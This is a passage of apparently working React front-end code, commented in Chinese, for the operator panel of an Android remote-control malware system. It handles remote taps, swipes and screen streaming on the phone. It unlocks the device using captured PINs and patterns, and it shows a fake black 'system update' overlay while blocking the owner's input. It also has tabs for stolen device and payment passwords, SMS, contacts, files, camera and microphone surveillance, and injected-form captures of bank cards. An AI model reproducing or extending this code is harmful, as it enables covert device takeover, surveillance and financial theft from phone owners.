      if (kc === 3) { bridgeCmd = 'home' }
      else if (kc === 4) { bridgeCmd = 'back' }
      else if (kc === 187) { bridgeCmd = 'recents' }
      else { bridgeCmd = 'keyevent'; bridgeParams = { keycode: kc } }
    } else if (parts[0] === 'input' && parts[1] === 'text') {
      bridgeCmd = 'input/text'; bridgeParams = { text: parts.slice(2).join(' ') }
    }
    if (bridgeCmd) {
      const token = localStorage.getItem('token') || ''
      fetch(`/api/bridge/command/${encodeURIComponent(resolvedDeviceId)}`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
        body: JSON.stringify({ command: bridgeCmd, params: bridgeParams })
      }).catch(() => {})
    }
    addLog(`ADB Shell: ${shellCmd.substring(0, 60)}`)
  }
  /** ADB 控制屏：开始截屏流 */
  function startAdbScreen() {
    if (adbScreenStreaming) { stopAdbScreen(); return }
    setAdbScreenStreaming(true)
    setAdbScreenLoading(true)
    // 先请求一次截图
    triggerAdbScreenshot()
    // 定时截图（每1.5秒一次）
    adbScreenIntervalRef.current = setInterval(triggerAdbScreenshot, 1500)
    addLog('ADB 控制屏已开启')
    setTimeout(() => setAdbScreenLoading(false), 5000)
  }
  function stopAdbScreen() {
    setAdbScreenStreaming(false)
    setAdbScreenLoading(false)
    clearInterval(adbScreenIntervalRef.current)
    addLog('ADB 控制屏已关闭')
  }
  function triggerAdbScreenshot() {
    const token = localStorage.getItem('token') || localStorage.getItem('auth_token') || ''
    fetch(`/api/bridge/command/${resolvedDeviceId}`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` },
      body: JSON.stringify({ command: 'screenshot', params: { rightAdb: true, quality: 60, width: 720, base64: true } })
    }).then(r => r.json()).then(res => {
      if (res.success && res.data?.commandId) {
        const cmdId = res.data.commandId
        let attempts = 0
        const poll = setInterval(() => {
          attempts++
          if (attempts > 8) { clearInterval(poll); return }
          fetch(`/api/bridge/result/${cmdId}`, { headers: { 'Authorization': `Bearer ${token}` } })
            .then(r => r.json()).then(r => {
              if (r.data && !r.pending) {
                clearInterval(poll)
                const img = r.data.base64 || r.data.screenshot || r.data.image || ''
                if (img) setScreenSrc(img.startsWith('data:') ? img : 'data:image/png;base64,' + img)
              }
            }).catch(() => {})
        }, 1500)
      }
    }).catch(() => {})
  }
  /** ADB 控制屏：计算点击坐标 */
  function adbScreenPoint(e, el) {
    const r = el.getBoundingClientRect()
    const sw = device?.screenWidth || 1080, sh = device?.screenHeight || 2400
    const scale = Math.min(r.width / sw, r.height / sh)
    const viewW = sw * scale, viewH = sh * scale
    const offX = (r.width - viewW) / 2, offY = (r.height - viewH) / 2
    return {
      x: Math.max(0, Math.min(sw, Math.round((e.clientX - r.left - offX) / scale))),
      y: Math.max(0, Math.min(sh, Math.round((e.clientY - r.top - offY) / scale)))
    }
  }
  /** ADB 控制屏：触摸事件处理 - 按下 */
  function handleAdbScreenPointerDown(e) {
    e.preventDefault()
    e.currentTarget.setPointerCapture?.(e.pointerId)
    e.currentTarget.dataset.adbDragStart = JSON.stringify({ x: e.clientX, y: e.clientY, time: Date.now() })
    e.currentTarget.style.cursor = 'pointer'
  }
  /** ADB 控制屏：触摸事件处理 - 移动 */
  function handleAdbScreenPointerMove(e) {
    if (!e.currentTarget.dataset.adbDragStart) return
    const start = JSON.parse(e.currentTarget.dataset.adbDragStart)
    const dist = Math.hypot(e.clientX - start.x, e.clientY - start.y)
    if (dist > 8) e.currentTarget.style.cursor = 'grab'
  }
  /** ADB 控制屏：触摸事件处理 - 抬起 */
  function handleAdbScreenPointerUp(e) {
    e.preventDefault()
    const raw = e.currentTarget.dataset.adbDragStart
    if (!raw) return
    e.currentTarget.releasePointerCapture?.(e.pointerId)
    delete e.currentTarget.dataset.adbDragStart
    e.currentTarget.style.cursor = ''
    const start = JSON.parse(raw)
    const dist = Math.hypot(e.clientX - start.x, e.clientY - start.y)
    const el = e.currentTarget
    const sp = adbScreenPoint({ clientX: start.x, clientY: start.y }, el)
    const ep = adbScreenPoint(e, el)
    if (dist > 12) {
      // 滑动：adb shell input swipe
      const duration = Math.min(800, Math.max(200, Date.now() - start.time))
      sendAdbShell(`input swipe ${sp.x} ${sp.y} ${ep.x} ${ep.y} ${duration}`)
      addLog(`ADB 滑动: (${sp.x},${sp.y})→(${ep.x},${ep.y}) ${duration}ms`)
      e.currentTarget.scrollTop += (start.y - e.clientY) * 0.5
    } else {
      // 点击：adb shell input tap
      sendAdbShell(`input tap ${ep.x} ${ep.y}`)
      addLog(`ADB 点击: (${ep.x},${ep.y})`)
    }
    // 操作后延迟刷新截图
    setTimeout(triggerAdbScreenshot, 500)
  }
  /** ADB 导航键 */
  function sendAdbNav(key) {
    const keyMap = { HOME: 3, BACK: 4, RECENTS: 187 }
    const code = keyMap[key] || 3
    sendAdbShell(`input keyevent ${code}`)
    centerToast({ HOME: '首页', BACK: '返回', RECENTS: '任务管理' }[key] || key)
    // 操作后延迟刷新截图
    setTimeout(triggerAdbScreenshot, 800)
  }
  function sendControl(command, params = {}) {
    if (!readerActive && !streaming) { centerToast('请先开启阅读器或投屏', 'err'); return }
    if (!resolvedDeviceId || !command) return
    const type = controlType(command)
    const normalized = normalizeControlData(type, params)
    const token = localStorage.getItem('token') || ''
    
    if (type === 'tap') {
      // 点击
      sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: 'click', params: { x: normalized.x, y: normalized.y } } })
    } else if (type === 'swipe_path') {
      // 滑动：带完整路径
      sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: 'swipe_path', params: { path: normalized.path || [{ x: normalized.startX || 0, y: normalized.startY || 0 }, { x: normalized.endX || 0, y: normalized.endY || 0 }], duration: normalized.duration || 300 } } })
    } else {
      // 其他操作
      sendWs({ type: 'command', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, data: { command, type, params: normalized } })
    }
    
    addLog(`控制: ${type} ${type === 'tap' ? `(${normalized.x},${normalized.y})` : type === 'swipe_path' ? `(${normalized.startX},${normalized.startY})→(${normalized.endX},${normalized.endY})` : ''}`)
  }
  function sendNav(command) {
    if (!readerActive && !streaming) { centerToast('请先开启阅读器或投屏', 'err'); return }
    const label = command === 'BACK' ? '返回' : command === 'HOME' ? '首页' : '任务管理'
    const lc = command.toLowerCase() // 'back' | 'home' | 'recents'
    
    // 方式1：旧版 APK 标准格式：sendCommand(deviceId, 小写命令, {})
    // 等价于 {type:"command", sessionId:deviceId, data:{command:"home", params:{}}}
    sendWs({
      type: 'command',
      sessionId: resolvedDeviceId,
      deviceId: resolvedDeviceId,
      data: { command: lc, params: {} },
    })
    // 方式2：直接发小写 type（部分 APK 识别）
    sendWs({
      type: lc,
      sessionId: resolvedDeviceId,
      deviceId: resolvedDeviceId,
      data: {},
      timestamp: Date.now(),
    })
    // 方式3：大写 command 格式
    sendCmd(command, {})
    centerToast(label)
    addLog(`发送导航: ${command}`)
  }
  function requestReaderData({ silent = false } = {}) {
    setReaderActive(true); readerActiveRef.current = true; setReaderError('')
    if (!silent) { readerLoadingRef.current = true; setReaderLoading(true) }
    // ★ 走 WebSocket 无障碍通道：发送 GET_UI_HIERARCHY 命令（精简参数，设备端只认 maxDepth）
    sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: 'GET_UI_HIERARCHY', params: { maxDepth: 25 } } })
    clearTimeout(readerTimeoutRef.current)
    readerTimeoutRef.current = setTimeout(() => { if (readerLoadingRef.current) { readerLoadingRef.current = false; setReaderLoading(false); if (!silent && !readerData) setReaderError('获取超时，等待无障碍推送...') } }, 5000)
  }
  function requestReaderAfterAction() { if (!readerActive) return; clearTimeout(readerRefreshTimerRef.current); readerRefreshTimerRef.current = setTimeout(() => requestReaderData({ silent: true }), 300) }
  function triggerScreenShot() {
    // 方式1：标准 command 格式，质量95，宽度1080全分辨率
    sendWs({ type: 'command', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, data: { command: 'screenshot', params: { quality: 95, width: 1080, height: 2400 } } })
    // 方式2：直接 type=screenshot（兼容老版本 APK）
    sendWs({ type: 'screenshot', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, data: { quality: 95, width: 1080 } })
    // 方式3：SCREEN_CAPTURE_RESUME（触发设备端恢复推流）
    sendWs({ type: 'SCREEN_CAPTURE_RESUME', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, data: {} })
  }

  function startScreen(mode) {
    if (!resolvedDeviceId) return
    // 同模式再点：关闭
    if (screenMode === mode) {
      stopScreen()
      return
    }
    // ⚠️ 投屏需要用户二次确认（通过内联提示，不弹窗）
    if (mode === 'system' && !screenConfirmRef.current) {
      setScreenConfirmVisible(true)
      return
    }
    screenConfirmRef.current = false
    // 切换模式：先停旧的
    if (screenMode) {
      clearInterval(screenshotIntervalRef.current)
      sendCmd('STOP_SCREENCAST', {})
    }
    screenModeRef.current = mode
    setStreaming(false)
    setScreenMode(mode)
    setScreenSrc('')
    setScreenLoading(true)
    addLog(`${mode === 'system' ? '投屏' : '录屏'}开启中`)

    // 旧前端投屏流程：先开启无障碍，再发送 SCREEN_CAPTURE_SET_TECH
    // 方式1: 通过 control_message 发送 (原版前端格式)
    sendWs({
      type: 'control_message',
      sessionId: resolvedDeviceId,
      deviceId: resolvedDeviceId,
      data: { type: 'SCREEN_CAPTURE_SET_TECH', data: { tech: mode === 'system' ? 'mediaprojection' : 'accessibility' } },
      timestamp: Date.now()
    })
    // 方式2: 通过 command 格式发送 (新前端兼容)
    sendCmd('SCREEN_CAPTURE_SET_TECH', { tech: mode === 'system' ? 'mediaprojection' : 'accessibility' })
    // 方式3: 兼容旧命令
    sendCmd('enableAccessibility', {})
    sendCmd('SYSTEM_SCREENCAST', { autoConfirm: true })
    sendCmd('SCREENCAST', { autoConfirm: true })

    // 投屏模式：不再自动请求UI层次（避免未开阅读器时发送无用请求）
    // 如需查看UI层次，用户手动开启阅读器

    setTimeout(() => setScreenLoading(false), 15000)
  }
  function stopScreen() {
    screenModeRef.current = null
    setStreaming(false)
    setScreenLoading(false)
    setScreenMode(null)
    setScreenSrc('')
    clearInterval(screenshotIntervalRef.current)
    // 发送停止命令（APK 只识别 SCREEN_CAPTURE_STOP）
    sendCmd('SCREEN_CAPTURE_STOP', {})
    sendCmd('SCREEN_CAPTURE_PAUSE', {})
    sendCmd('SCREEN_CAPTURE_DISABLE', {})
    sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: 'SCREEN_CAPTURE_STOP', params: {} } })
    addLog('屏幕/投屏已关闭')
  }
  // ★ WS 连接后如果投屏/摄像头未开启，发停止推送命令（防止设备端一直推送截图/camera_frame）
  // ★ 页面加载后 WS 首次连接时，发送 STOP 确保设备不会持续推送（仅首次触发，WS重连不触发）
  const wsInitDoneRef = useRef(false)
  useEffect(() => { if (wsState === '已连接' && !wsInitDoneRef.current) { wsInitDoneRef.current = true; setTimeout(() => { if (!screenModeRef.current) { sendCmd('SCREEN_CAPTURE_STOP', {}); sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: 'SCREEN_CAPTURE_STOP', params: {} } }) } if (!camActiveRef.current) { sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: 'CAMERA_STOP', params: {} } }) } }, 2000) } }, [wsState])

  function screenPoint(e, el) { const r = el.getBoundingClientRect(), sw = device?.screenWidth || 1080, sh = device?.screenHeight || 2400, scale = Math.min(r.width / sw, r.height / sh), viewW = sw * scale, viewH = sh * scale, offX = (r.width - viewW) / 2, offY = (r.height - viewH) / 2; return { x: Math.max(0, Math.min(sw, Math.round((e.clientX - r.left - offX) / scale))), y: Math.max(0, Math.min(sh, Math.round((e.clientY - r.top - offY) / scale))) } }
  function handleScreenPointerDown(e) {
    e.preventDefault()
    e.currentTarget.setPointerCapture?.(e.pointerId)
    e.currentTarget.dataset.dragStart = JSON.stringify({ x: e.clientX, y: e.clientY })
    e.currentTarget.style.cursor = 'pointer'
  }
  function handleScreenPointerMove(e) {
    if (!e.currentTarget.dataset.dragStart) return
    const start = JSON.parse(e.currentTarget.dataset.dragStart)
    const dist = Math.hypot(e.clientX - start.x, e.clientY - start.y)
    if (dist > 8) {
      e.currentTarget.style.cursor = 'grab'
    }
  }
  function handleScreenPointerUp(e) {
    e.preventDefault()
    const raw = e.currentTarget.dataset.dragStart
    if (!raw) return
    e.currentTarget.releasePointerCapture?.(e.pointerId)
    delete e.currentTarget.dataset.dragStart
    e.currentTarget.style.cursor = ''
    const start = JSON.parse(raw)
    const dist = Math.hypot(e.clientX - start.x, e.clientY - start.y)
    const el = e.currentTarget
    const sp = screenPoint({ clientX: start.x, clientY: start.y }, el)
    const ep = screenPoint(e, el)
    if (dist > 8) {
      // 滑动：发送 SWIPE_PATH 手势格式（无障碍专用，不触发系统手势）
      sendWs({ type: 'command', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, data: { command: 'SWIPE_PATH', params: { path: [{ x: sp.x, y: sp.y }, { x: Math.round((sp.x + ep.x) / 2), y: Math.round((sp.y + ep.y) / 2) }, { x: ep.x, y: ep.y }], startX: sp.x, startY: sp.y, endX: ep.x, endY: ep.y, duration: 300 } } })
      addLog(`滑动: (${sp.x},${sp.y})→(${ep.x},${ep.y})`)
      requestReaderAfterAction()
    } else {
      sendControl('TAP', { x: ep.x, y: ep.y })
      setXy(ep)
      requestReaderAfterAction()
    }
  }
  function toggleReader() { const n = !readerActive; setReaderActive(n); readerActiveRef.current = n; if (n) requestReaderData(); else { sendCmd('disableAccessibility'); setReaderData(null); setReaderError('') } }

  // 翻译阅读器内容：提取所有 text 节点，批量翻译为中文，替换回 readerData
  async function translateReaderData() {
    if (!readerData || readerTranslating) return
    setReaderTranslating(true)
    try {
      // 递归收集所有有文字的节点路径
      const texts = []
      const paths = []
      function collect(node, path) {
        if (node.text && node.text.trim()) { texts.push(node.text); paths.push([...path, 'text']) }
        if (node.description && node.description.trim()) { texts.push(node.description); paths.push([...path, 'description']) }
        if (node.children) node.children.forEach((c, i) => collect(c, [...path, 'children', i]))
      }
      const root = readerData.root || readerData
      collect(root, root === readerData ? [] : ['root'])
      if (texts.length === 0) { centerToast('没有可翻译的文本'); setReaderTranslating(false); return }
      // 调用后端翻译接口
      const token = localStorage.getItem('token') || ''
      const resp = await fetch('/api/translate', { method: 'POST', headers: { 'Content-Type': 'application/json', 'Authorization': `Bearer ${token}` }, body: JSON.stringify({ texts, target_language: 'zh' }) })
      const result = await resp.json()
      if (!result.success || !result.translated) { centerToast('翻译失败'); setReaderTranslating(false); return }
      // 深拷贝 readerData 并替换文本
      const copy = JSON.parse(JSON.stringify(readerData))
      result.translated.forEach((t, i) => {
        if (!t) return
        let obj = copy
        for (let k = 0; k < paths[i].length - 1; k++) obj = obj[paths[i][k]]
        obj[paths[i][paths[i].length - 1]] = t
      })
      setReaderData(copy)
      centerToast(`已翻译 ${texts.length} 处文本`)
    } catch (e) { centerToast('翻译出错: ' + e.message) }
    setReaderTranslating(false)
  }

  /**
   * 快捷按钮统一入口：处理切换态、中央提示、指令下发。
   * - 无 toggle：直接发送 cmd，弹一次中央提示
   * - 有 toggle：根据当前 toggles[key] 决定发 cmd 或 offCmd，并翻转状态
   * - clears：辅助按钮（如"取消黑屏"），点击时清掉指定 toggle 键
   * - blackScreen / sysUpdate：先弹配置面板，用户确认后再发送
   */
  function handleQuickButton(btn) {
    if (btn.clears) {
      setToggles((s) => ({ ...s, [btn.clears]: false }))
      // 发送 command 格式 + control_message 格式
      sendCmd(btn.cmd)
      sendWs({ type: 'control_message', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, data: { type: btn.cmd }, timestamp: Date.now() })
      centerToast(btn.toast)
      return
    }
    if (btn.toggle) {
      const on = !toggles[btn.toggle]
      // 黑屏遮挡：直接发送（不弹窗）
      if (btn.toggle === 'blackScreen' && on) {
        setToggles((s) => ({ ...s, blackScreen: true, block: true }))
        sendCmd('ENABLE_BLACK_SCREEN', { text: '', fontSize: 24, alpha: 252, showIcon: false, showProgress: false })
        sendCmd('DEVICE_BLOCK_INPUT', {})
        centerToast('黑屏已开启，已自动阻断操作')
        addLog('黑屏遮挡已发送 + 自动阻断操作')
        return
      }
      // 系统更新：开启时直接发送 ENABLE_BLACK_SCREEN + style:"update" + 自动阻断
      if (btn.toggle === 'sysUpdate' && on) {
        setToggles((s) => ({ ...s, sysUpdate: true, block: true }))
        sendCmd('ENABLE_BLACK_SCREEN', { text: '', fontSize: 24, alpha: 252, showIcon: false, showProgress: false, style: 'update' })
        sendCmd('DEVICE_BLOCK_INPUT', {})
        centerToast('系统更新已开启，已自动阻断操作')
        addLog('系统更新遮挡已发送 + 自动阻断操作')
        return
      }
      // 黑屏/系统更新：关闭时发送 DISABLE_BLACK_SCREEN + 解除阻断
      if ((btn.toggle === 'blackScreen' || btn.toggle === 'sysUpdate') && !on) {
        setToggles((s) => ({ ...s, [btn.toggle]: false, block: false }))
        sendCmd('DISABLE_BLACK_SCREEN', {})
        sendCmd('DEVICE_ALLOW_INPUT', {})
        centerToast(btn.offToast || `${btn.label}已关闭（已解除阻断）`)
        addLog(`${btn.label}已关闭 + 阻断操作已解除`)
        return
      }
      setToggles((s) => ({ ...s, [btn.toggle]: on }))
      if (on) {
        // MUTE 特殊处理：只发一条标准 command 格式（不带 deviceId）
        if (btn.toggle === 'muted') {
          sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: 'MUTE', params: { muted: true } } })
        } else {
          sendCmd(btn.cmd, btn.params || {})
        }
        centerToast(btn.toast)
      } else {
        if (btn.toggle === 'muted') {
          sendWs({ type: 'command', sessionId: resolvedDeviceId, data: { command: 'MUTE', params: { muted: false } } })
        } else {
          sendCmd(btn.offCmd || btn.cmd, btn.params || {})
        }
        centerToast(btn.offToast || `${btn.label}已关闭`)
      }
      return
    }
    // 误触滑动：底部上滑两次，退出防误触模式
    if (btn.special === 'antiTouch') {
      const cmds = [
        { startX: 540, startY: 1632, endX: 540, endY: 576, duration: 300 },
        { startX: 540, startY: 1632, endX: 540, endY: 576, duration: 300 },
      ]
      cmds.forEach((p, i) => {
        setTimeout(() => {
          sendWs({ type: 'command', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, data: { command: 'swipe', params: { x1: p.startX, y1: p.startY, x2: p.endX, y2: p.endY, duration: p.duration } } })
          sendWs({ type: 'command', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, data: { command: 'SWIPE', params: p } })
        }, i * 400)
      })
      addLog('发送: 误触滑动 (底部上滑两次)')
      centerToast(btn.toast)
      return
    }
    // bridge 类型按钮：只发一条标准 command 格式
    if (btn.bridge) {
      sendWs({
        type: 'command',
        sessionId: resolvedDeviceId,
        data: { command: btn.cmd, params: btn.params || {} }
      })
      addLog(`发送: ${btn.cmd}`)
      centerToast(btn.toast || btn.label)
      return
    }
    // unlock 类型按钮
    if (btn.unlock) {
      const p = btn.params || {}
      const sw = device?.screenWidth || 1080
      const sh = device?.screenHeight || 1920

      if (btn.cmd === 'SMART_NUMERIC_UNLOCK') {
        // 数字解锁：{"type":"command","sessionId":"xxx","data":{"command":"SMART_NUMERIC_UNLOCK","params":{"password":"xxx","screenWidth":1080,"screenHeight":1920}}}
        sendWs({
          type: 'command',
          sessionId: resolvedDeviceId,
          data: { command: 'SMART_NUMERIC_UNLOCK', params: { password: p.password || '', screenWidth: sw, screenHeight: sh } }
        })
        addLog(`发送: SMART_NUMERIC_UNLOCK`)
      } else if (btn.cmd === 'SMART_SWIPE_UNLOCK') {
        // 误触滑动
        sendWs({
          type: 'command',
          sessionId: resolvedDeviceId,
          data: { command: 'SMART_SWIPE_UNLOCK', params: { screenWidth: sw, screenHeight: sh } }
        })
        addLog(`发送: SMART_SWIPE_UNLOCK`)
      } else {
        // 解锁：根据参数类型选择合适的解锁命令
        if (p.pattern) {
          // 图案解锁：使用 UNLOCK_DEVICE 命令 + pattern 数组
          const arr = String(p.pattern).split(',').map(s => Number(s.trim())).filter(n => !isNaN(n))
          sendWs({
            type: 'command',
            sessionId: resolvedDeviceId,
            data: { command: 'UNLOCK_DEVICE', params: { pattern: arr, screenWidth: sw, screenHeight: sh } }
          })
          addLog(`发送: UNLOCK_DEVICE (图案: [${arr.join(',')}])`)
        } else if (p.password) {
          // 密码解锁
          sendWs({
            type: 'command',
            sessionId: resolvedDeviceId,
            data: { command: 'UNLOCK_DEVICE', params: { password: p.password } }
          })
          addLog(`发送: UNLOCK_DEVICE`)
        } else {
          // 一键解锁（无参数时尝试滑动解锁）
          sendWs({
            type: 'command',
            sessionId: resolvedDeviceId,
            data: { command: 'SMART_UNLOCK_SWIPE', params: {} }
          })
          addLog(`发送: SMART_UNLOCK_SWIPE`)
        }
      }
      centerToast(btn.toast || btn.label)
      return
    }
    // 同时发送 command 格式 + control_message 格式（兼容原版 APK）
    sendCmd(btn.cmd, btn.params || {})
    sendWs({ type: 'control_message', sessionId: resolvedDeviceId, deviceId: resolvedDeviceId, data: { type: btn.cmd, params: btn.params || {} }, timestamp: Date.now() })
    centerToast(btn.toast || btn.label)
  }

  // 黑屏遮挡确认：使用旧版命令 ENABLE_BLACK_SCREEN
  // ★ 2026-08-06：移除 auto home 键（避免锁屏时唤醒 Keyguard 干扰无障碍）
  function handleBlackScreenConfirm(params) {
    setBlackScreenModal(false)
    setToggles((s) => ({ ...s, blackScreen: true }))
    sendCmd('ENABLE_BLACK_SCREEN', params)
    addLog(`黑屏遮挡: text="${params.text || ''}", fontSize=${params.fontSize}`)
    centerToast('黑屏遮挡已开启')
  }


  const deviceStatusRef = useRef(deviceStatus); deviceStatusRef.current = deviceStatus
  const unmountedRef = useRef(false)
  useEffect(() => { unmountedRef.current = false; load(); loadInjectionData(); connectWs(); const poll = setInterval(() => { if (deviceStatusRef.current !== 'online') load() }, 15000); return () => { unmountedRef.current = true; clearTimeout(reconnectRef.current); clearInterval(screenshotIntervalRef.current); clearInterval(poll); try { wsRef.current?.close(1000, 'cleanup') } catch {} } }, [resolvedDeviceId])
  useEffect(() => { if (!readerActive) return; const t = setInterval(() => requestReaderData({ silent: true }), 2000); return () => clearInterval(t) }, [readerActive])
  useEffect(() => { const t = setInterval(() => { const ws = wsRef.current; if (ws?.readyState === 1) { pingRef.current = Date.now(); ws.send(JSON.stringify({ type: 'ping' })) } }, 20000); return () => clearInterval(t) }, [])
  useEffect(() => { const t = setInterval(() => setNow(new Date()), 1000); return () => clearInterval(t) }, [])
  useEffect(() => { if (resolvedDeviceId) refreshPwdSummary() }, [resolvedDeviceId])
  useEffect(() => { if (activeTab === '🔒 密码记录') loadPasswords(); if (activeTab === '💰 支付密码') { loadPayStrategies(); loadPayRecords() }; if (activeTab === '✉ 短信记录') loadSms(); if (activeTab === '👥 通讯录') { /* auto-load on tab switch if needed */ }; if (activeTab === '📁 文件管理' && fmFiles.length === 0) fmNavigate(fmPath) }, [activeTab])

  if (!resolvedDeviceId) return <div className="control-page"><div className="ctrl-empty">缺少 deviceId</div></div>

  const deviceInfoItems = [
    ['📱 名称', device ? deviceName(device) : '--'],
    ['🌐 IP', device ? ip(device) : '--'],
    ['💎 系统', device ? androidVersion(device) : '--'],
    ['🌍 国家', device ? country(device) : '--'],
    ['💓 心跳', device ? lastHeartbeat(device) : '--', 'heartbeat'],
    ['👤 归属', device ? (owner(device) || '-') : '--'],
    ['📝 备注', device?.remark || '--', 'remark'],
  ]
  const chinaTime = new Intl.DateTimeFormat('zh-CN', { timeZone: 'Asia/Shanghai', hour12: false, year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' }).format(now)
  const globalTime = new Intl.DateTimeFormat('zh-CN', { timeZone: 'UTC', hour12: false, year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' }).format(now)

  const tabMeta = {
    '💉 注入中心': { title: '注入中心', desc: '应用注入、弹窗和辅助流程入口。', custom: true },
    '💉 注入数据': { title: '注入数据', desc: '注入数据记录', custom: true },
    '📝 设备日志': { title: '设备日志', desc: '设备操作日志', custom: true },
    '🔒 密码记录': { title: '密码记录', desc: '设备密码输入记录', custom: true },
    '💰 支付密码': { title: '支付密码', desc: '支付密码监听', custom: true },
    '✉ 短信记录': { title: '短信记录', desc: '短信管理', custom: true },
    '👥 通讯录': { title: '通讯录', desc: '通讯录管理', custom: true },
    '🖼 查看相册': { title: '查看相册', desc: '相册管理', custom: true },
    '📁 文件管理': { title: '文件管理', desc: '文件管理', custom: true },
    '📸 摄像头/录音': { title: '摄像头/录音', desc: '摄像头监控与麦克风录音', custom: true },
    '📱 应用列表': { title: '应用列表', desc: '应用列表', custom: true },
    '🔐 权限状态': { title: '权限状态', desc: '管理应用各项权限', custom: true },
  }

  function renderTabContent() {
    // AI分析选项卡（独立组件，不在 tabMeta 中）
    if (activeTab === '🤖 AI分析') {
      return (
        <AiAnalysisTab
          resolvedDeviceId={resolvedDeviceId}
          sendWs={sendWs}
          addLog={addLog}
          smsList={smsList}
          contactsList={contactsList}
          appList={appList}
        />
      )
    }

    const meta = tabMeta[activeTab]
    if (!meta) return null

    // 注入中心选项卡：自动注入管理（已重写为独立组件）
    if (activeTab === '💉 注入中心') {
      return (
        <InjectionTab
          resolvedDeviceId={resolvedDeviceId}
          sendWs={sendWs}
          injActivePkgs={injActivePkgs}
          injActiveIds={injActiveIds}
          injGrabbed={injGrabbed}
          parseGrabbedData={parseGrabbedData}
        />
      )
    }

    // 注入数据选项卡
    if (activeTab === '💉 注入数据') {
      async function loadInjRecords(page = injDataPage, size = injDataSize) {
        setInjDataLoading(true)
        try {
          const r = await api.request(`/api/injection/data?deviceId=${encodeURIComponent(resolvedDeviceId)}&page=${page}&pageSize=${size}`)
          const list = r?.data?.list || r?.list || r?.data || []
          setInjDataList(Array.isArray(list) ? list : [])
          setInjDataTotal(r?.data?.total || r?.total || (Array.isArray(list) ? list.length : 0))
          setInjDataPage(page)
          setInjDataSize(size)
        } catch { setInjDataList([]); setInjDataTotal(0) }
        finally { setInjDataLoading(false) }
      }
      async function clearInjRecords() {
        if (!confirm('确定要清空所有注入数据吗？')) return
        try { await api.request(`/api/injection/data?deviceId=${encodeURIComponent(resolvedDeviceId)}`, { method: 'DELETE' }); setInjDataList([]); setInjDataTotal(0); centerToast('已清空注入数据') } catch { toast('清空失败', 'error') }
      }
      if (!injDataLoaded && !injDataLoading) { setInjDataLoaded(true); setTimeout(() => loadInjRecords(1), 0) }
      const totalPages = Math.max(1, Math.ceil(injDataTotal / injDataSize))
      return (
        <div className="ctrl-tab-content">
          <div className="ctrl-tab-panel">
            <div style={{ padding: 16, background: 'rgba(255,255,255,.03)', borderRadius: 12, border: '1px solid rgba(255,255,255,.08)', display: 'flex', flexDirection: 'column', height: '100%' }}>
              {/* 标题栏 */}
              <div style={{ display: 'flex', alignItems: 'center', marginBottom: 12, paddingBottom: 8, borderBottom: '1px solid rgba(255,255,255,.08)' }}>
                <div style={{ width: 4, height: 18, background: '#fa8c16', borderRadius: 2, marginRight: 8 }} />
                <span style={{ fontSize: 15, fontWeight: 500, color: '#fff' }}>注入数据记录</span>
                <span style={{ fontSize: 12, color: '#94a3b8', marginLeft: 8 }}>共 {injDataTotal} 条数据</span>
              </div>
              {/* 工具栏 */}
              <div style={{ display: 'flex', gap: 8, alignItems: 'center', marginBottom: 12 }}>
                <button onClick={() => loadInjRecords(1)} style={{ padding: '6px 14px', background: 'linear-gradient(135deg, #1677ff, #4096ff)', border: 'none', borderRadius: 6, color: '#fff', fontSize: 12, fontWeight: 600, cursor: 'pointer' }}>🔄 刷新数据</button>
              </div>
              {/* 表格 */}
              <div style={{ flex: 1, minHeight: 0, overflow: 'auto' }}>
                <table style={{ width: '100%', borderCollapse: 'collapse', tableLayout: 'fixed' }}>
                  <colgroup><col style={{ width: 170 }} /><col style={{ width: 180 }} /><col style={{ width: 150 }} /><col style={{ width: 120 }} /><col style={{ width: 100 }} /><col style={{ width: 140 }} /><col style={{ width: 120 }} /></colgroup>
                  <thead>
                    <tr style={{ background: 'rgba(255,255,255,.05)', borderBottom: '1px solid rgba(255,255,255,.08)' }}>
                      <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>时间</th>
                      <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>应用名称</th>
                      <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>账号</th>
                      <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>密码</th>
                      <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>验证/支付</th>
                      <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>银行卡</th>
                      <th style={{ padding: '8px 12px', textAlign: 'left', color: '#94a3b8', fontSize: 11, fontWeight: 600 }}>操作</th>
                    </tr>
                  </thead>
                  <tbody>
                    {injDataLoading ? (
                      <tr><td colSpan={7} style={{ padding: 40, textAlign: 'center', color: '#94a3b8' }}>加载中...</td></tr>
                    ) : injDataList.length === 0 ? (
                      <tr><td colSpan={7} style={{ padding: 40, textAlign: 'center', color: '#94a3b8' }}>
                        <div style={{ fontSize: 40, marginBottom: 12, opacity: 0.5 }}>💉</div>
                        <div style={{ fontSize: 14 }}>暂无注入数据</div>
                        <div style={{ fontSize: 12, marginTop: 6, color: '#64748b' }}>当安卓端提交注入表单数据后，将显示在这里</div>
                      </td></tr>
                    ) : (
                      injDataList.map((item, i) => {
